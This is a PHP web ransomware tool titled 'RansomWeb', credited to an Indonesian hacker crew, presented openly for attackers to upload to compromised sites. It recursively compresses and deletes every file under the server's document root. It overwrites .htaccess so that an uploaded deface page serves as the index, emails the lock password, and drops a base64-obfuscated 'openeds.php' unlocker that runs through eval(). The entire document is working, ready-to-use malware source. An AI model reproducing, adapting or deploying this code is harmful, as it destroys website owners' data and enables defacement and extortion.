<?php
/*
Created By CodeXploit|Mr.R4ND5
Official 22XploiterCrew
Error? Ya Maap:)
*/
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
?>
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.75, shrink-to-fit=no">
    <meta name="theme-color" content="#000">
    <meta name="description" content="RansomWeb BlackCoders XploiterCrew">
  <meta name="author" content="CodeXploit|Mr.R4ND5">
    <!-- Bootstrap CSS -->
    <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">
    <link rel="icon" href="https://images2.imgbox.com/90/f8/AN2yEUQJ_o.jpg" type="image/jpg">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <title>RansomWeb BlackCoders XploiterCrew</title>
    <style>
    	body{
    		background-color: black;
    		color: white;
    	}
    	#pass{
    		background-color: black;
    		color: white;
    		padding-right: 2px;
    	}
    	h2{
    		font-family: "Rock Salt";
    	}
    	img{
    		width: 450px;
    		height: 10px;
    		opacity:0.050;
				filter:alpha(opacity=10);
				border: 2px solid white;
				transition: 2s;
    	}
    	img:hover{
    		opacity:1;
				filter:alpha(opacity=100);
				width: 450px;
    		height: 260px;
    	}
    </style>
  </head>
  <body>
    <div class="container">
    	<h2 class="text-center mb-3 mt-3">RansomWeb</h2>
    	<hr>
    	<img src="https://2.bp.blogspot.com/-FjTg4da7Ngg/W_enfrQrQzI/AAAAAAAAD9g/1NXQHWOa8XsgMZCRD7M-Ki9l4vWwRomYACLcBGAs/s640/kimi.hime___Bb_Dskthn-7___.jpg" class="mx-auto d-block">
    	<hr>
    	<form method="post" class="was-validated" enctype="multipart/form-data">
    	<div class="table-bordered p-1">
  		<div class="row">
  			<div class="col">
  			<input id="uploadFile" placeholder="Nama File(Index Web)" disabled="disabled" class="form-control bg-transparent text-light" id="look">
  				</div>
  				<div class="col">
  		<div class="input-group">
  <div class="custom-file">
    <input type="file" class="custom-file-input bg-transparent" id="uploadBtn" name="upl_file">
    <label class="custom-file-label bg-transparent" for="uploadFile"></label>
    </div>
  </div>
 </div>
</div>
</div><hr>
    		<div class="row">
    			<div class="col">
    				<input type="text" name="pass" class="form-control" id="pass" required="required" placeholder="Password" autocomplete="off">
    			</div>
    			<div class="col">
    				<input type="email" name="msg" class="form-control" id="pass" required="required" autocomplete="off" placeholder="Emailmu(Bwt Send Pass)">
    			</div>
    		</div>
    		<input type="submit" class="btn btn-outline-success text-light btn-block mt-2" value="Kunci">
    	</form>
    	<hr>
    		<center>
    			<small>
    			<!-- Ganti Mandull + Maqlo Heker -->
    				Copyright &copy; <?= date('Y'); ?> BlackCoders XploiterCrew
    			</small>
    		</center>
    </div>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
<script type="text/javascript">
	document.getElementById("uploadBtn").onchange = function(){
		document.getElementById("uploadFile").value = this.value;
};
</script>
  </body>
</html>
<?php
if(isset($_POST["pass"])){
// Kirim Password
$untuk   = $_POST["msg"];
$subject = "Password RansomWeb BlackCoders XploiterCrew";
$headers = "[!] Password RansomWeb [!]";
$website = $_SERVER["HTTP_HOST"];
$pass    = $_POST["pass"];
$pesan   = "Nama Domain : ".$website."\nPassword : ".$pass."\nTerkunci Pada : ".date('l, d-M-Y')."\nAkses Buka File : http://".$website."/openeds.php";
if(!mail($untuk,$subject,$pesan,$headers)){
	echo "<script>
prompt('Gagal Mengunci File','Alasan => Karena Server Tidak Dapat Mengirim Email. Tar kalo lupa password lu bakal nangis');
</script>";
exit;
}else{

// Luncurkan Aksi
function KunciFile($NamaFile){
		if(strpos($NamaFile, '.xploiter') !== false){
// Kembalikan
			return;
		}
file_put_contents($NamaFile.'.xploiter',gzdeflate(file_get_contents($NamaFile), 9));
copy('.htaccess','.htaccess(BackUp)');
// Hapus File
unlink($NamaFile);

echo "$NamaFile => Terkunci\n";
}
	
echo "<hr>
<center>
<p>Locked File</p>
<small>
Buka File => ".$_SERVER["HTTP_HOST"]."/openeds.php
</small>
</center>
<textarea class='form-control text-dark' disabled rows='8'>";

/* */
function KunciDir($dir){
		$files = array_diff(scandir($dir), array('.','..'));
		foreach($files as $key){
			if(is_dir($dir."/".$key)){
				KunciDir($dir."/".$key);
			}else{
				KunciFile($dir."/".$key);
			}
		}
	}
if(isset($_POST["pass"])){
		KunciDir($_SERVER["DOCUMENT_ROOT"]);
function NamaDomain($url){
			$x = parse_url($url);
			$y = isset($x['host']) ? $x['host'] : '';
			if(preg_match('/(?P<domain>[a-z0-9][a-z0-9\-]{1,63}\.[a-z\.]{2,6})$/i', $y, $a)){
				return $a['domain'];
			} return FALSE;
		}
	}

// Buat Tampilan index web
$server_web = $_SERVER["DOCUMENT_ROOT"];
$nama_file  = $_FILES["upl_file"]["name"];
$tmp_upload = $server_web.'/'.$nama_file;
@copy($_FILES["upl_file"]["tmp_name"],$tmp_upload);
				 
// Buat .htaccess
$b = "#Locked\nDirectoryIndex $nama_file\nErrorDocument 404 /$nama_file";
$a =  fopen(".htaccess","w");
			fwrite($a,$b);
			fclose($a);

// Buat Akses Buka File [ Jangan Diganti!! ]
$x = base64_decode("PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCj8+DQo8IWRvY3R5cGUgaHRtbD4NCjxodG1sIGxhbmc9ImVuIj4NCiAgPGhlYWQ+DQogICAgPCEtLSBSZXF1aXJlZCBtZXRhIHRhZ3MgLS0+DQogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPg0KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MC43NSwgc2hyaW5rLXRvLWZpdD1ubyI+DQoJCTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iQ29kZVhwbG9pdHxNci5SNE5ENSI+DQoJCTxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJVbmxvY2sgUmFuc29tV2ViIEJsYWNrQ29kZXJzIFhwbG9pdGVyQ3JldyI+DQogICAgPCEtLSBCb290c3RyYXAgQ1NTIC0tPg0KICAgIDxsaW5rIHJlbD0iaWNvbiIgaHJlZj0iaHR0cHM6Ly9jZG4ucGl4YWJheS5jb20vcGhvdG8vMjAxMi8wNS8wNy8wMi80OS9waXJhdGUtNDc3MDVfOTYwXzcyMC5wbmciIHR5cGU9ImltYWdlL2pwZyI+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL3N0YWNrcGF0aC5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC80LjEuMy9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIGludGVncml0eT0ic2hhMzg0LU1Ddzk4L1NGbkdFOGZKVDNHWHdFT25nc1Y3WnQyN05YRm9hb0FwbVltODFpdVhvUGtGT0p3SjhFUmRrbkxQTU8iIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPg0KICAgIDx0aXRsZT5SYW5zb21XZWIgQmxhY2tDb2RlcnMgWHBsb2l0ZXJDcmV3PC90aXRsZT4NCiAgPC9oZWFkPg0KICA8Ym9keSBjbGFzcz0iYmctZGFyayI+DQogIAk8aDMgY2xhc3M9InRleHQtY2VudGVyIHRleHQtbGlnaHQgbXQtMyI+R2F1c2FoIFRlcmxhbHUgUmliZXQgR2F5bjwvaDM+PGhyPg0KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+DQogICAgCTxmb3JtIG1ldGhvZD0icG9zdCI+DQogICAgCQk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFzcyIgY2xhc3M9ImZvcm0tY29udHJvbCBtYi0zIiBwbGFjZWhvbGRlcj0iWWFuZyBQZW50aW5nIFlha2luIj4NCiAgICAJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkgYnRuLWJsb2NrIiB2YWx1ZT0iQnVrYSBGaWxlIj4NCiAgICAJPC9mb3JtPg0KICAgIAk8aHI+DQogICAgCQk8Y2VudGVyPg0KICAgIAkJCTxzbWFsbCBjbGFzcz0idGV4dC1saWdodCI+DQogICAgCQkJPCEtLSBHYW50aSBNYW5kdWxsICsgTWFxbG8gSGVrZXIgLS0+DQogICAgCQkJCUNvcHlyaWdodCAmY29weTsgPD89IGRhdGUoJ1knKTsgPz4gQmxhY2tDb2RlcnMgWHBsb2l0ZXJDcmV3DQogICAgCQkJPC9zbWFsbD4NCiAgICAJCTwvY2VudGVyPg0KICAgIDwvZGl2Pg0KDQogICAgPCEtLSBPcHRpb25hbCBKYXZhU2NyaXB0IC0tPg0KICAgIDwhLS0galF1ZXJ5IGZpcnN0LCB0aGVuIFBvcHBlci5qcywgdGhlbiBCb290c3RyYXAgSlMgLS0+DQogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY29kZS5qcXVlcnkuY29tL2pxdWVyeS0zLjMuMS5zbGltLm1pbi5qcyIgaW50ZWdyaXR5PSJzaGEzODQtcThpL1grOTY1RHpPMHJUN2FiSzQxSlN0UUlBcVZnUlZ6cGJ6bzVzbVhLcDRZZlJ2SCs4YWJ0VEUxUGk2aml6byIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+PC9zY3JpcHQ+DQogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL3BvcHBlci5qcy8xLjE0LjMvdW1kL3BvcHBlci5taW4uanMiIGludGVncml0eT0ic2hhMzg0LVpNUDdyVm8zbUl5a1YrMis5SjNVSjQ2akJrMFdMYVVBZG42ODlhQ3dvcWJCSmlTbmpBSy9sOFd2Q1dQSVBtNDkiIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPjwvc2NyaXB0Pg0KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL3N0YWNrcGF0aC5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC80LjEuMy9qcy9ib290c3RyYXAubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1DaGZxcXh1WlVDbkpTSzMrTVhtUE5JeUU2WmJXaDJJTXFFMjQxcllpcUp4eU1pWjZPVy9KbVpRNXN0d0VVTFR5IiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4NCiAgPC9ib2R5Pg0KPC9odG1sPg0KPD9waHANCiRwYXNzID0gIkhhY2tlZCI7IC8vIFBhc3N3b3JkIERlZmF1bHQNCiRtYWlsID0gImFrdWhla2VyQHBlcm8uY29tIjsNCiRkcHMgID0gImlraXNrcmlwa3V4Y29rIjsNCmlmKGlzc2V0KCRfUE9TVFsicGFzcyJdKSl7DQoJaWYobWQ1KCRfUE9TVFsicGFzcyJdKSA9PSAkcGFzcyl7DQoJCWZ1bmN0aW9uIEJ1a2FGaWxlKCROYW1hRmlsZSl7DQoJCQlpZihzdHJwb3MoJE5hbWFGaWxlLCcueHBsb2l0ZXInKSA9PT0gRkFMU0Upew0KCQkJCXJldHVybjsgLy8gS2VtYmFsaWthbiENCgkJCX0NCiRCdWthID0gZ3ppbmZsYXRlKGZpbGVfZ2V0X2NvbnRlbnRzKCROYW1hRmlsZSkpOw0KZmlsZV9wdXRfY29udGVudHMoc3RyX3JlcGxhY2UoJy54cGxvaXRlcicsICcnLCAkTmFtYUZpbGUpLCAkQnVrYSk7DQoNCi8vIEhhcHVzIEZpbGUNCnVubGluaygnLmh0YWNjZXNzJyk7DQp1bmxpbmsoJE5hbWFGaWxlKTsNCg0KZWNobyAiJE5hbWFGaWxlID0+IFRlcmJ1a2FcbiI7DQoJCX0NCgkJDQplY2hvICI8aHI+DQo8Y2VudGVyPg0KPHAgY2xhc3M9J3RleHQtbGlnaHQnPlVubG9jayBGaWxlPC9wPg0KPC9jZW50ZXI+DQo8dGV4dGFyZWEgY2xhc3M9J2Zvcm0tY29udHJvbCB0ZXh0LWRhcmsnIGRpc2FibGVkIHJvd3M9JzgnPiI7DQoNCgkJZnVuY3Rpb24gQnVrYURpcigkZGlyKXsNCgkJCSRmaWxlcyA9IGFycmF5X2RpZmYoc2NhbmRpcigkZGlyKSwgYXJyYXkoJy4nLCAnLi4nKSk7DQoJCQlmb3JlYWNoKCRmaWxlcyBhcyAka2V5KXsNCgkJCQlpZihpc19kaXIoJGRpci4iLyIuJGtleSkpew0KCQkJCQlCdWthRGlyKCRkaXIuIi8iLiRrZXkpOw0KCQkJCX1lbHNlew0KCQkJCQlCdWthRmlsZSgkZGlyLiIvIi4ka2V5KTsNCgkJCQl9DQoJCQl9DQoJCX0NCgkJQnVrYURpcigkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKTsNCgkJdW5saW5rKCRfU0VSVkVSWydQSFBfU0VMRiddKTsNCgkJdW5saW5rKCdvcGVuZWRzLnBocCcpOw0KCQl1bmxpbmsoJy5odGFjY2VzcycpOw0KCQljb3B5KCcuaHRhY2Nlc3MoQmFja1VwKScsJy5odGFjY2VzcycpOw0KCQl1bmxpbmsoJy5odGFjY2VzcyhCYWNrVXApJyk7DQoNCiR1bnR1ayAgID0gJG1haWw7DQokc3ViamVjdCA9ICJSYW5zb21XZWIgQmxhY2tDb2RlcnMgWHBsb2l0ZXJDcmV3IjsNCiRoZWFkZXJzID0gIlshXSBSYW5zb21XZWIgQmxhY2tDb2RlcnMgWHBsb2l0ZXJDcmV3IFshXSI7DQokd2Vic2l0ZSA9ICRfU0VSVkVSWyJIVFRQX0hPU1QiXTsNCiRwZXNhbiAgID0gIk5hbWEgRG9tYWluIDogIi4kd2Vic2l0ZS4iXG5UZXJidWthIFBhZGEgOiAiLmRhdGUoJ2wsIGQtTS1ZJykuIlxuU2NyaXB0IERlZmFjZSA6IGh0dHA6Ly8iLiR3ZWJzaXRlLiIvIi4kZHBzLiJcblxuVGhhbmtzIERhaCBNZW5nZ3VuYWthbiBSYW5zb20gS2FtaTopIjsNCm1haWwoJHVudHVrLCRzdWJqZWN0LCRwZXNhbiwkaGVhZGVycyk7DQoJDQplY2hvICI8L3RleHRhcmVhPg0KPHNjcmlwdD4NCnByb21wdCgnU3Vrc2VzIE1lbWJ1a2EgU2VtdWEgRmlsZScsZG9jdW1lbnQuZG9tYWluKTsNCjwvc2NyaXB0PiI7DQoJfWVsc2V7DQoJCWVjaG8gIjxzY3JpcHQ+YWxlcnQoJ1Bhc3N3b3JkIFRpZGFrIENvY29rJyk8L3NjcmlwdD4iOw0KCX0NCglleGl0Ow0KfQ0KPz4=");
$mx = str_replace("akuheker@pero.com", $_POST["msg"], $x);
$y = str_replace("Hacked", md5($_POST["pass"]), $mx);
$xyz = str_replace("ikiskripkuxcok", $nama_file, $y);
$z = "<?php eval('?>'.base64_decode("."'".base64_encode($xyz)."'".").'<?php '); ?>";
$xy = fopen('openeds.php','w');
			fwrite($xy, $z);
			fclose($xy);


/* Done */
	
echo "</textarea>
<script>
prompt('Sukses Mengunci Semua File',document.domain);
</script>";
	}
}
?>